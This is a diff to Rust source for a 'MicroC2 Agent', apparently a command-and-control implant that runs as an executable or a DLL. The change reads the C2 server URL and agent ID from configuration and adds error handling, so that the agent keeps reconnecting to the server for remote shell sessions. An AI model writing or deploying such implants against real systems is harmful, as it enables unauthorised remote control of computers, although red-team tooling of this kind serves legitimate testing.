@@ -24,20 +24,24 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
 
 // Shared agent code used by both executable and DLL
 async fn run_agent() -> Result<(), Box<dyn std::error::Error>> {
-    let agent_id = Uuid::new_v4().to_string();
     println!("[STARTUP] MicroC2 Agent starting...");
+    
+    // Load configuration
+    let config = AgentConfig::load().map_err(|e| {
+        eprintln!("[FATAL] Failed to load configuration: {}", e);
+        eprintln!("[FATAL] Agent requires valid server_url and payload_id in configuration");
+        e
+    })?;
+    
+    // Use payload_id from config
+    let agent_id = config.payload_id.clone();
     println!("[INFO] Agent ID: {}", agent_id);
     
-    // Load configuration or use command line args
-    let config = AgentConfig::load()?;
-    let server_addr = env::args()
-        .nth(1)
-        .unwrap_or_else(|| config.get_server_url());
-    
+    let server_addr = config.get_server_url();
     println!("[NETWORK] Attempting connection to C2: {}", server_addr);
     
     loop {
-        match run_shell(&server_addr).await {
+        match run_shell(&server_addr, &agent_id).await {
             Ok(_) => println!("[INFO] Shell session ended"),
             Err(e) => println!("[ERROR] Shell error: {}. Retrying...", e),
         }
@@ -80,11 +84,14 @@ pub extern "C" fn RunAgent() -> c_int {
         Ok(rt) => {
             // Run the agent in the runtime
             rt.block_on(async {
-                let _ = run_agent().await;
+                match run_agent().await {
+                    Ok(_) => (),
+                    Err(e) => eprintln!("[FATAL] Agent error: {}", e)
+                }
             });
-            1 // Success
+            1 // Success (even if there was an error, we don't want to crash)
         },
-        Err(_) => 0 // Failure
+        Err(_) => 0 // Runtime creation failure
     }
 }
 
